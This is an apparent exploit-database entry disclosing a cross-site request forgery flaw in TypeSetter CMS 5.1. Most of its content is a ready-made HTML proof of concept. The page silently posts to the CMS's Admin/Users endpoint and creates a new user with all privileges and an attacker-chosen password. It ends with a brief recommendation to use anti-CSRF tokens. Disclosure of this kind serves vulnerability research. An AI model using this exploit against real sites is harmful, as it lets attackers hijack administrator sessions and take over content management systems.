@@ -1,0 +1,40 @@
+# Exploit Title: TypeSetter CMS 5.1 Cross Site Request Forgery
+# Date: 10-02-2018
+# Exploit Author: Navina Asrani
+# Contact: https://twitter.com/NavinaSanjay
+# Website: https://securitywarrior9.blogspot.in/
+# Vendor Homepage: https://www.typesettercms.com/
+# Version: 5.1
+# CVE : NA
+# Category: Webapp CMS
+
+1. Description
+
+The application allows malcious HTTP requests to be directly executed without any hidden security token.This may lead to user account takeover or malious command execution
+
+2. Proof of Concept
+
+Exploit code:
+
+<html>
+  <body>
+    <form action="http://localhost/cms/Admin/Users" method="POST">
+      <input type="hidden" name="verified" value="475f10871b08f44c20dab5bc2cb55d17946e6c98fa8abf28c64a5a9dab0ee2e122fefcc29cae9cc2e48daf564bfe55665e26b2b2174dee14e83c5e6974cf3218" />
+      <input type="hidden" name="username" value="samrat&#95;test" />
+      <input type="hidden" name="password" value="sam9318" />
+      <input type="hidden" name="password1" value="sam9318" />
+      <input type="hidden" name="algo" value="password&#95;hash" />
+      <input type="hidden" name="email" value="sam9318&#64;gmail&#46;com" />
+      <input type="hidden" name="grant&#95;all" value="all" />
+      <input type="hidden" name="cmd" value="newuser" />
+      <input type="hidden" name="aaa" value="Save" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+ 
+
+   
+3. Solution:
+
+To Mitigate CSRF vulnerability, it is recommeded to enforce security tokens such as anti csrf tokens​
